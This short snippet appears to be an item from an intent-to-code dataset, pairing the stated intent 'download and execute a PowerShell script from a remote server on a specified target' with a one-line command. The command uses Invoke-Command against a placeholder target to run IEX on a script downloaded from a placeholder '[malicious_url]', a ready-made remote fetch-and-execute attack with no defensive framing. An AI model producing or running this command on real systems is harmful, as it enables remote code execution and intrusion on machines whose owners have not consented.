# Natural language intent:
# Download and execute a PowerShell script from a remote server on a specified target.

Invoke-Command -ComputerName [target] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://[malicious_url]')}
